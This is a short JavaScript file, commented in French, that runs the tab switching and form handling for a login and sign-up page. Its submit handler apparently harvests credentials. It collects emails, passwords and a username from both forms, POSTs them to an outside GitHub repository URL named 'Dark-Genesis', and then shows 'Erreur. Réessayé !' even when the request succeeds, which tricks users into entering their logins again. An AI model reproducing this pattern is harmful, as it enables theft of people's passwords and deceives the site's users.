function openTab(event, tabName) {
    event.preventDefault(); // Empêche le comportement par défaut du lien (scroll en haut de la page)

    var i, tabcontent, tablinks;
    tabcontent = document.getElementsByClassName("tab-content");
    for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";  // Cache tous les onglets
    }
    tablinks = document.getElementsByClassName("tab-link");
    for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");  // Retire la classe active
    }
    document.getElementById(tabName).style.display = "block";  // Affiche l'onglet ciblé
    event.currentTarget.className += " active";  // Ajoute la classe active sur l'onglet cliqué
}

document.addEventListener('DOMContentLoaded', function () {
    var loginForm = document.querySelector('#Tab1 form');
    loginForm.addEventListener('submit', function (event) {
        event.preventDefault(); // Empêche le comportement par défaut du formulaire

        var email = document.querySelector('#Tab2 #email').value;
        var password = document.querySelector('#Tab2 #password').value;
        var name = document.querySelector('#Tab1 #username').value;
        var email1 = document.querySelector('#Tab1 #email').value;
        var password1 = document.querySelector('#Tab1 #password').value;

        // Envoyer les informations de connexion à votre serveur
        fetch('https://github.com/Creator-Marl/Dark-Genesis.git', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ email: email, password: password, name : name, email1 : email1, password1 : password1 })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Succès:', data);
            alert('Erreur. Réessayé !');
        })
        .catch((error) => {
            console.error('Erreur:', error);
            alert('Erreur lors de la connexion.');
        });
    });

});

